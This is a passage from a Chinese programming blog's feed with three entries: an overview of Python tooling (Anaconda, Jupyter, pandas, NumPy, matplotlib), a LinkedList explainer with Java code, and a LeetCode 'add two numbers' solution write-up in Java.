        <content type="html"><![CDATA[<h1 id="环境及工具准备"><a href="#环境及工具准备" class="headerlink" title="环境及工具准备"></a>环境及工具准备</h1><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p>Python 是一种解释型的、面向对象的、移植性强的高级程序设计语言。</p><p>开发者：吉多·范罗苏姆</p><ul><li>解释型：不需要编译成二进制代码，可以直接从源码运行</li><li>面向对象：Python既支持面向过程的编程也支持面向对象的编程</li><li>可移植性：由于它的开源本质，可以在不同的平台开发</li><li>高层语言：无须考虑诸如如何管理程序使用的内存一类的底层细节</li><li>官网：<a href="http://www.python.org/">www.python.org/</a></li></ul><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><ul><li>简单易学</li><li>开发效率高</li><li>高级语言</li><li>可移植性</li><li>可扩展性</li><li>可嵌入性</li></ul><h2 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h2><ul><li>速度慢</li><li>代码不能加密</li></ul><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="Anaconda"><a href="#Anaconda" class="headerlink" title="Anaconda"></a>Anaconda</h2><p>Anaconda 是一个方便的 python 包管理和环境管理软件</p><ul><li>支持 Linux、Mac、Windows</li><li>可以很方便的解决多版本 python 并存、切换以及各种第三方包安装问题</li></ul><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul><li>跨平台、同时实现包管理、环境管理的功能</li><li>使用方便、环境部署步骤简单</li><li>官方网站：<a href="http://www.anaconda.com/">www.anaconda.com/</a></li></ul><hr><h2 id="Jupyter-notebook"><a href="#Jupyter-notebook" class="headerlink" title="Jupyter notebook"></a>Jupyter notebook</h2><p>Jupyter Notebook 是一个开源的 Web 应用程序，允许开发者方便的创建和共享代码文档。</p><ul><li>可以实时写代码、运行代码、查看结果，并可视化数据</li></ul><h2 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h2><ul><li>允许把代码写入独立的 cell 中，然后单独运行。用户可以在测试项目时单独测试特定代码块，无需从头开始执行代码</li><li>基于 web 框架进行交互开发，非常方便。</li><li>官方网站：<a href="https://jupyter.org/">https://jupyter.org/</a></li></ul><hr><h1 id="基础工具包"><a href="#基础工具包" class="headerlink" title="基础工具包"></a>基础工具包</h1><h2 id="pandas"><a href="#pandas" class="headerlink" title="pandas"></a>pandas</h2><p>一个强大的分析结构化数据的工具集，可用于快速实现数据导入导出、索引。</p><p>官网：<a href="http://www.pypandas.cn/">www.pypandas.cn/</a></p><h2 id="matplotlib"><a href="#matplotlib" class="headerlink" title="matplotlib"></a>matplotlib</h2><p>Python 基础绘图库，几行代码即可生成绘图，直方图、条形图、散点图等。</p><p>官网：<a href="http://www.matplotlib.org.cn/">www.matplotlib.org.cn/</a></p><h2 id="Numpy"><a href="#Numpy" class="headerlink" title="Numpy"></a>Numpy</h2><p>使用 Python 进行科学计算的基础软件包。</p><p>核心：基于 N 维数组对象 ndarray 的数组运算。</p><p>官网：<a href="http://www.numpy.org.cn/">www.numpy.org.cn/</a></p>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人工智能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LinkedList 链表</title>
      <link href="/blog/fc225c14.html/"/>
      <url>/blog/fc225c14.html/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>链表（LinkedList）是一种常见的数据结构，是一种线性表，但是并不会按线性的顺序存储数据，而是每一个节点里存到下一个节点的地址。</p><p>链表可以分为单向链表和双向链表。</p><p>一个单项链表包含两个值：当前节点的值和指向下一个节点的链接。</p><p>一个双向链表由三个整数值：当前节点的值、向后的节点链接、前向的节点链接。</p><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><ul><li>需要循环迭代来访问列表中的某些元素。</li><li>需要频繁的在列表开头、中间、末尾等位置进行添加和删除元素操作。</li></ul><h2 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> dataStructure;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 20:43 2022/11/2</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LinkedList</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个简单的链表实例</span></span><br><span class="line">        java.util.LinkedList&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">java</span>.util.LinkedList&lt;&gt;();</span><br><span class="line">        list.add(<span class="string">&quot;Google&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;Baidu&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;Weibo&quot;</span>);</span><br><span class="line">        <span class="comment">// 在列表开头添加元素</span></span><br><span class="line">        list.addFirst(<span class="string">&quot;Apple&quot;</span>);</span><br><span class="line">        <span class="comment">// 在列表尾部添加元素</span></span><br><span class="line">        list.addLast(<span class="string">&quot;End&quot;</span>);</span><br><span class="line">        <span class="comment">// 移除头部元素</span></span><br><span class="line">        list.removeFirst();</span><br><span class="line">        <span class="comment">// 移除尾部元素</span></span><br><span class="line">        list.removeLast();</span><br><span class="line">        <span class="comment">// 获取头部元素</span></span><br><span class="line">        System.out.println(list.getFirst());</span><br><span class="line">        <span class="comment">// 获取尾部元素</span></span><br><span class="line">        System.out.println(list.getLast());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出列表</span></span><br><span class="line">        System.out.println(list);</span><br><span class="line"></span><br><span class="line">        System.out.println(list.size());</span><br><span class="line">        <span class="comment">//  size 迭代列表中元素</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> list.size(), i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">            System.out.println(list.get(i));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// foreach 迭代元素</span></span><br><span class="line">        <span class="keyword">for</span> (String str : list) &#123;</span><br><span class="line">            System.out.println(str);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode_两数相加</title>
      <link href="/blog/8b849cb2.html/"/>
      <url>/blog/8b849cb2.html/</url>
      
        <content type="html"><![CDATA[<h1 id="两数相加"><a href="#两数相加" class="headerlink" title="两数相加"></a>两数相加</h1><p>给你两个 非空 的链表，表示两个非负的整数。它们每位数字都是按照 逆序 的方式存储的，并且每个节点只能存储 一位 数字。</p><p>请你将两个数相加，并以相同形式返回一个表示和的链表。</p><p>你可以假设除了数字 0 之外，这两个数都不会以 0 开头。</p><h2 id="算法实现（方法一）"><a href="#算法实现（方法一）" class="headerlink" title="算法实现（方法一）"></a>算法实现（方法一）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> leetCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 20:16 2022/11/2</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> * 两数相加</span></span><br><span class="line"><span class="comment"> * 给你两个 非空 的链表，表示两个非负的整数。它们每位数字都是按照 逆序 的方式存储的，并且每个节点只能存储 一位 数字。</span></span><br><span class="line"><span class="comment"> * 请你将两个数相加，并以相同形式返回一个表示和的链表。</span></span><br><span class="line"><span class="comment"> * 你可以假设除了数字 0 之外，这两个数都不会以 0 开头。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * example:</span></span><br><span class="line"><span class="comment"> * 2——4——3</span></span><br><span class="line"><span class="comment"> * 5——6——4</span></span><br><span class="line"><span class="comment"> * 7——0——8</span></span><br><span class="line"><span class="comment"> * 输入：l1 = [2,4,3], l2 = [5,6,4]</span></span><br><span class="line"><span class="comment"> * 输出：[7,0,8]</span></span><br><span class="line"><span class="comment"> * 解释：342 + 465 = 807.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 输入：l1 = [0], l2 = [0]</span></span><br><span class="line"><span class="comment"> * 输出：[0]</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 输入：l1 = [9,9,9,9,9,9,9], l2 = [9,9,9,9]</span></span><br><span class="line"><span class="comment"> * 输出：[8,9,9,9,0,0,0,1]</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 每个链表中的节点数在范围 [1, 100] 内</span></span><br><span class="line"><span class="comment"> * 0 &lt;= Node.val &lt;= 9</span></span><br><span class="line"><span class="comment"> * 题目数据保证列表表示的数字不含前导零</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Two</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        LinkedList&lt;Integer&gt; l1 = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        l1.add(<span class="number">9</span>);</span><br><span class="line">        l1.add(<span class="number">9</span>);</span><br><span class="line">        l1.add(<span class="number">9</span>);</span><br><span class="line">        l1.add(<span class="number">9</span>);</span><br><span class="line">        l1.add(<span class="number">9</span>);</span><br><span class="line">        l1.add(<span class="number">9</span>);</span><br><span class="line">        l1.add(<span class="number">9</span>);</span><br><span class="line">        System.out.println(l1);</span><br><span class="line">        LinkedList&lt;Integer&gt; l2 = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        l2.add(<span class="number">9</span>);</span><br><span class="line">        l2.add(<span class="number">9</span>);</span><br><span class="line">        l2.add(<span class="number">9</span>);</span><br><span class="line">        l2.add(<span class="number">9</span>);</span><br><span class="line">        System.out.println(l2);</span><br><span class="line">        System.out.println(addTwoNumbers(l1, l2));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Author: Rupert-Tears</span></span><br><span class="line"><span class="comment">     * CreateTime: 20:21 2022/11/2</span></span><br><span class="line"><span class="comment">     * Description: 两数之和</span></span><br><span class="line"><span class="comment">     * 解题思路：先将链表中的值倒序取出，然后求和，再倒序装入</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> LinkedList&lt;String&gt; <span class="title function_">addTwoNumbers</span><span class="params">(LinkedList&lt;Integer&gt; l1, LinkedList&lt;Integer&gt; l2)</span> &#123;</span><br><span class="line">        LinkedList&lt;Integer&gt; r1 = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        LinkedList&lt;Integer&gt; r2 = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> l1.size(), i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> l1.removeLast();</span><br><span class="line">            r1.add(tmp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> l2.size(), i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> l2.removeLast();</span><br><span class="line">            r2.add(tmp);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将列表中的数转化为 int 类型</span></span><br><span class="line">        <span class="comment">// [3, 4, 2]  ==&gt; 342</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> r1.toString().substring(<span class="number">1</span>);   <span class="comment">// 去除[</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> str1.substring(<span class="number">0</span>, str1.length() - <span class="number">1</span>);    <span class="comment">// 去除]</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str3</span> <span class="operator">=</span> str2.replaceAll(<span class="string">&quot;,&quot;</span>, <span class="string">&quot;&quot;</span>);  <span class="comment">// 去除分割符号 ,</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str4</span> <span class="operator">=</span> str3.replaceAll(<span class="string">&quot;\\s+&quot;</span>, <span class="string">&quot;&quot;</span>);   <span class="comment">// 去除空格</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">v1</span> <span class="operator">=</span> Integer.parseInt(str4);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">str12</span> <span class="operator">=</span> r2.toString().substring(<span class="number">1</span>);   <span class="comment">// 去除[</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str22</span> <span class="operator">=</span> str12.substring(<span class="number">0</span>, str12.length() - <span class="number">1</span>);    <span class="comment">// 去除]</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str32</span> <span class="operator">=</span> str22.replaceAll(<span class="string">&quot;,&quot;</span>, <span class="string">&quot;&quot;</span>);  <span class="comment">// 去除分割符号 ,</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str42</span> <span class="operator">=</span> str32.replaceAll(<span class="string">&quot;\\s+&quot;</span>, <span class="string">&quot;&quot;</span>);   <span class="comment">// 去除空格</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">v2</span> <span class="operator">=</span> Integer.parseInt(str42);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 运算 807</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> v1 + v2;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 倒序装入列表 [7,0,8]</span></span><br><span class="line">        LinkedList&lt;String&gt; result = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">String</span> <span class="variable">sumStr</span> <span class="operator">=</span> sum + <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; sumStr.length(); i++) &#123;</span><br><span class="line">            <span class="comment">// 插入头部</span></span><br><span class="line">            result.addFirst(String.valueOf(sumStr.charAt(i)));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="相关知识-LinkedList"><a href="#相关知识-LinkedList" class="headerlink" title="相关知识 LinkedList"></a>相关知识 LinkedList</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>链表（LinkedList）是一种常见的数据结构，是一种线性表，但是并不会按线性的顺序存储数据，而是每一个节点里存到下一个节点的地址。</p><p>链表可以分为单向链表和双向链表。</p><p>一个单项链表包含两个值：当前节点的值和指向下一个节点的链接。</p><p>一个双向链表由三个整数值：当前节点的值、向后的节点链接、前向的节点链接。</p><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><ul><li>需要循环迭代来访问列表中的某些元素。</li><li>需要频繁的在列表开头、中间、末尾等位置进行添加和删除元素操作。</li></ul><h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> dataStructure;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 20:43 2022/11/2</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LinkedList</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个简单的链表实例</span></span><br><span class="line">        java.util.LinkedList&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">java</span>.util.LinkedList&lt;&gt;();</span><br><span class="line">        list.add(<span class="string">&quot;Google&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;Baidu&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;Weibo&quot;</span>);</span><br><span class="line">        <span class="comment">// 在列表开头添加元素</span></span><br><span class="line">        list.addFirst(<span class="string">&quot;Apple&quot;</span>);</span><br><span class="line">        <span class="comment">// 在列表尾部添加元素</span></span><br><span class="line">        list.addLast(<span class="string">&quot;End&quot;</span>);</span><br><span class="line">        <span class="comment">// 移除头部元素</span></span><br><span class="line">        list.removeFirst();</span><br><span class="line">        <span class="comment">// 移除尾部元素</span></span><br><span class="line">        list.removeLast();</span><br><span class="line">        <span class="comment">// 获取头部元素</span></span><br><span class="line">        System.out.println(list.getFirst());</span><br><span class="line">        <span class="comment">// 获取尾部元素</span></span><br><span class="line">        System.out.println(list.getLast());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出列表</span></span><br><span class="line">        System.out.println(list);</span><br><span class="line"></span><br><span class="line">        System.out.println(list.size());</span><br><span class="line">        <span class="comment">//  size 迭代列表中元素</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> list.size(), i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">            System.out.println(list.get(i));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// foreach 迭代元素</span></span><br><span class="line">        <span class="keyword">for</span> (String str : list) &#123;</span><br><span class="line">            System.out.println(str);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="算法实现（方法二）"><a href="#算法实现（方法二）" class="headerlink" title="算法实现（方法二）"></a>算法实现（方法二）</h2><h3 id="测试类"><a href="#测试类" class="headerlink" title="测试类"></a>测试类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">listNode1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">1</span>);</span><br><span class="line">       <span class="type">ListNode</span> <span class="variable">listNode2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">3</span>, listNode1);</span><br><span class="line">       <span class="type">ListNode</span> <span class="variable">listNode3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">6</span>, listNode2);    <span class="comment">// 631 节点</span></span><br><span class="line"></span><br><span class="line">       <span class="type">ListNode</span> <span class="variable">listNode21</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">2</span>);</span><br><span class="line">       <span class="type">ListNode</span> <span class="variable">listNode22</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">3</span>, listNode21);</span><br><span class="line">       <span class="type">ListNode</span> <span class="variable">listNode23</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">6</span>, listNode22);    <span class="comment">// 632 节点</span></span><br><span class="line">       <span class="type">ListNode</span> <span class="variable">listNode24</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">9</span>, listNode23);</span><br><span class="line">       <span class="type">ListNode</span> <span class="variable">listNode25</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">9</span>, listNode24);</span><br><span class="line"></span><br><span class="line">       <span class="type">ListNode</span> <span class="variable">result</span> <span class="operator">=</span> sum(listNode3, listNode25);</span><br><span class="line">       <span class="keyword">while</span> (result != <span class="literal">null</span>) &#123;</span><br><span class="line">           System.out.println(result.val);</span><br><span class="line">           result = result.next;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert-Tears</span></span><br><span class="line"><span class="comment"> * CreateTime: 14:29 2022/11/11</span></span><br><span class="line"><span class="comment"> * Description: 链表方式求解</span></span><br><span class="line"><span class="comment"> * 第一步：按位求和</span></span><br><span class="line"><span class="comment"> * 第二部：进位</span></span><br><span class="line"><span class="comment"> * 第三部：处理特殊情况</span></span><br><span class="line"><span class="comment"> * 1. 长度问题</span></span><br><span class="line"><span class="comment"> * 2. 末尾进位</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ListNode <span class="title function_">sum</span><span class="params">(ListNode l1, ListNode l2)</span> &#123;</span><br><span class="line">    <span class="comment">// 接收参数值头节点</span></span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">head1</span> <span class="operator">=</span> l1;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">head2</span> <span class="operator">=</span> l2;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// l1 + l2 (l1 为基准)</span></span><br><span class="line">    <span class="keyword">while</span> (head1 != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (head2 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// head1 存储求和值</span></span><br><span class="line">            head1.val += head2.val;</span><br><span class="line">            <span class="comment">// 进行下一位运算</span></span><br><span class="line">            head2 = head2.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 若l1 下一位为空,l2还有值（l1.length &lt; l2.length）</span></span><br><span class="line">        <span class="keyword">if</span> (head1.next == <span class="literal">null</span> &amp;&amp; head2 != <span class="literal">null</span>) &#123;</span><br><span class="line">            head1.next = head2;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 更新head1</span></span><br><span class="line">        head1 = head1.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 进位操作（分组方法）</span></span><br><span class="line">    merge(l1);</span><br><span class="line">    <span class="keyword">return</span> l1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert-Tears</span></span><br><span class="line"><span 